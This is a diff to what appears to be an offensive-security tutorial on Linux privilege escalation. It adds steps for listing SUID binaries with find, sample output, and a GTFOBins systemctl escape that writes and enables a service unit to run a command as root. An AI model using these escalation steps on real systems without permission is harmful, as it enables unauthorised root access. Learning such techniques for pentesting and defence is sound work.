@@ -156,9 +156,10 @@ Now switch to the newroot user, using the new password:
 ### Process :
 
              step 1 : check listed programs which sudo allows your normal user to run using  " sudo -l " command on terminal 
-
+                    
              step 2: run shell escape according to your listed programs that was the result of sudo -l command 
-
+             
+             
 
 ☑️Attension Please : Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
 
@@ -247,5 +248,55 @@ If we successfully complete all those steps we get root power of target machine 
     #whoami
     root
 
+
+# 🔥06: Root Privilegers using Shell Escape Sequences :
+
+# Step 01 : Use given below command
+            find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
+# Check result and analyse properly
+           -rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
+-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
+-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
+-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
+-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
+
+
+# Step 3 : Go to GTFOBins website and choice escape shell according to your result
+      
+### Example :
+              if -rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl is vulnerable follow given below steps
+              
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
+            
+# Step 4:
+         cat /tmp/output
 #### 😍Happy Hacking 😍
     
